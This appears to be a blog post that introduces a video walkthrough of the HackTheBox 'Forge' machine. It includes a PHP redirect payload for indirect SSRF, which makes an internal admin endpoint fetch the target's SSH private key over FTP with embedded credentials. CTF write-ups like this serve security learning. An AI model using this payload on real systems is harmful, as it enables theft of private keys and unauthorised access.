---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/4WCOyL72yUE/0.jpg
layout: post
media_subpath: /assets/posts/2022-01-22-ssrf-python-debugger-forge-hackthebox
tags:
- hackthebox
- linux
- ssrf
title: SSRF & Python Debugger - Forge @ HackTheBox
---

We are solving Forge, a medium difficulty Linux machine on HackTheBox which involves an SSRF & playing with the python debugger.

{% youtube 4WCOyL72yUE %}

## Notes

**Indirect SSRF**

```php
<?php
header("Location:  http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@forge.htb/.ssh/id_rsa");
?>
```